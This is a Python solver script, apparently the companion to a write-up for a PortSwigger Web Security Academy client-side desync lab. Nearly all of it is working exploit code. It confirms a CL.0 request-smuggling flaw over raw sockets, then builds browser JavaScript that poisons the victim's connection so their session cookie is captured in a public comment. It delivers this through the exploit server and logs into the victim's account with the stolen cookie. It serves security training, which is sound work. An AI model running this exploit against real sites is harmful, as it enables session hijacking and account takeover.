#!/usr/bin/env python3
"""
Client-side desync
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 21-client-side-desync.md

What this does:
    Confirms a CL.0 discrepancy on / (the server ignores Content-Length on
    this path), then builds the JavaScript that replicates that desync
    from inside a victim's own browser: a fetch() with mode:'cors' against
    an endpoint that redirects without Access-Control-Allow-Origin fails
    with a CORS error, but the underlying TCP connection stays open because
    the connection itself succeeded -- only the cross-origin policy blocked
    reading the response. Catching that failure and firing a second
    fetch() immediately reuses the connection, delivering it right after
    the first request's smuggled prefix.

    The real payload smuggles a complete POST /en/post/comment request
    sized to capture as much of the victim's next request as possible, so
    when their own browser's next fetch (triggered by our .catch() handler)
    lands on the same poisoned connection, its bytes -- including their
    session cookie -- get appended into the comment field. This script
    stores that exploit HTML on the lab's exploit server, delivers it to
    the simulated victim, then reads the resulting public comment to steal
    their session cookie and uses it to load /my-account.

    capture_length has to be tuned -- long enough to swallow a meaningful
    slice of the victim's follow-up request, short enough not to run past
    it -- so this sweeps the same candidate values we tried by hand: 800,
    600, 500, 900, 1000.

Usage:
    python 21-client-side-desync.py <lab-url>
    e.g. python 21-client-side-desync.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def parse_response_status(response: bytes) -> int:
    match = re.search(rb"HTTP/[\d.]+\s+(\d+)", response)
    return int(match.group(1)) if match else 0


def verify_cl0_desync(host: str, endpoint: str = "/", port: int = 443, timeout: float = 5.0) -> bool:
    """Sends POST to endpoint with a body containing a smuggled 404 probe.
    If the connection desyncs, the follow-up GET comes back 404 instead of
    the normal homepage response."""
    smuggled = b"GET /hopefully404 HTTP/1.1\r\nFoo: x"
    req1 = (
        f"POST {endpoint} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Length: {len(smuggled)}\r\n"
        f"\r\n"
    ).encode() + smuggled
    req2 = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    s = create_ssl_connection(host, port, timeout=timeout)
    s.sendall(req1)
    time.sleep(0.5)
    s.settimeout(2)
    try:
        while True:
            if not s.recv(4096):
                break
    except socket.timeout:
        pass

    s.sendall(req2)
    time.sleep(0.5)
    r2 = b""
    s.settimeout(3)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            r2 += chunk
    except socket.timeout:
        pass
    s.close()
    return parse_response_status(r2) == 404


def extract_csrf_token(html: str) -> str | None:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else None


def exploit_client_side_desync(lab_host: str, exploit_host: str, session_cookie: str,
                                lab_analytics_cookie: str, csrf_token: str,
                                post_id: int = 1, capture_length: int = 800) -> str | None:
    """Builds and delivers the browser-side CSD exploit, then reads the
    resulting comment for the victim's captured session cookie."""
    lab_url = f"https://{lab_host}"
    exploit_url = f"https://{exploit_host}"

    comment_body = (
        f"csrf={csrf_token}"
        f"&postId={post_id}"
        f"&name=wiener"
        f"&email=wiener@web-security-academy.net"
        f"&website=https://ginandjuice.shop"
        f"&comment="
    )
    inner_cl = len(comment_body) + capture_length

    smuggled_lines = [
        "POST /en/post/comment HTTP/1.1",
        f"Host: {lab_host}",
        f"Cookie: session={session_cookie}; _lab_analytics={lab_analytics_cookie}",
        f"Content-Length: {inner_cl}",
        "Content-Type: x-www-form-urlencoded",
        "Connection: keep-alive",
        "",
        comment_body,
    ]
    smuggled_js = "\\r\\n".join(smuggled_lines)

    exploit_html = (
        "<script>\n"
        f"fetch('{lab_url}', {{\n"
        "    method: 'POST',\n"
        f"    body: '{smuggled_js}',\n"
        "    mode: 'cors',\n"
        "    credentials: 'include',\n"
        "}).catch(() => {\n"
        f"    fetch('{lab_url}/capture-me', {{\n"
        "        mode: 'no-cors',\n"
        "        credentials: 'include'\n"
        "    })\n"
        "})\n"
        "</script>"
    )

    s = httpx.Client(verify=False, follow_redirects=True)
    store_data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
        "responseBody": exploit_html,
        "formAction": "STORE",
    }
    s.post(exploit_url, data=store_data)
    store_data["formAction"] = "DELIVER_TO_VICTIM"
    s.post(exploit_url, data=store_data)

    time.sleep(8)  # give the simulated victim time to process the exploit

    r = s.get(f"{lab_url}/en/post?postId={post_id}")
    s.close()

    section = r.text[r.text.lower().find("comment"):] if "comment" in r.text.lower() else r.text
    m = re.search(r"session=([a-zA-Z0-9]{20,})", section)
    if m and m.group(1) != session_cookie:
        return m.group(1)

    for sess in re.findall(r"session=([a-zA-Z0-9]{20,})", r.text):
        if sess != session_cookie:
            return sess
    return None


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    print("[*] Step 1: verifying CL.0 desync on /...")
    if verify_cl0_desync(host, endpoint="/"):
        print("[+] CL.0 desync confirmed on /")
    else:
        print("[-] CL.0 desync not confirmed this probe -- continuing anyway")

    print("[*] Step 2: fetching session/csrf state...")
    client = httpx.Client(verify=False, follow_redirects=True)
    client.get(f"{lab_url}/en")
    session_cookie = dict(client.cookies).get("session", "")
    lab_analytics = dict(client.cookies).get("_lab_analytics", "")
    print(f"[+] Session: {session_cookie[:20]}...")
    print(f"[+] _lab_analytics: {lab_analytics[:20]}...")

    r = client.get(f"{lab_url}/en/post?postId=1")
    csrf = extract_csrf_token(r.text)
    print(f"[+] CSRF: {csrf}")

    exploit_match = re.search(r'(https?://exploit-[a-z0-9\-]+\.exploit-server\.net)', r.text)
    if not exploit_match:
        exploit_match = re.search(
            r'(https?://exploit-[a-z0-9\-]+\.exploit-server\.net)', client.get(f"{lab_url}/en").text
        )
    if not exploit_match:
        print("[-] Could not find this lab instance's exploit server URL -- visit the lab once first.")
        client.close()
        return
    exploit_host = urlparse(exploit_match.group(1)).hostname
    print(f"[+] Exploit server: {exploit_host}")

    print("[*] Step 3: deploying the client-side desync exploit...")
    victim_session = None
    for capture_len in (800, 600, 500, 900, 1000):
        print(f"[*] Trying capture_length={capture_len}...")
        victim_session = exploit_client_side_desync(
            lab_host=host, exploit_host=exploit_host, session_cookie=session_cookie,
            lab_analytics_cookie=lab_analytics, csrf_token=csrf, post_id=1,
            capture_length=capture_len,
        )
        if victim_session:
            print(f"[+] Victim session stolen: {victim_session}")
            break
        r = client.get(f"{lab_url}/en/post?postId=1")
        new_csrf = extract_csrf_token(r.text)
        if new_csrf:
            csrf = new_csrf

    if not victim_session:
        print("[-] Failed to capture the victim's session cookie across all capture lengths.")
        client.close()
        return

    print("[*] Step 4: accessing the victim's account...")
    r = client.get(f"{lab_url}/my-account", cookies={"session": victim_session}, follow_redirects=True)
    if "Your username" in r.text or "my-account" in str(r.url):
        m = re.search(r"Your username is:?\s*(\w+)", r.text)
        print(f"[+] Logged in as: {m.group(1)}" if m else "[+] Accessed victim's account successfully")
    else:
        print(f"[-] Could not access victim's account (status={r.status_code})")

    client.close()
    check = httpx.get(lab_url + "/", verify=False)
    print(f"[+] Solved: {'is-solved' in check.text}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
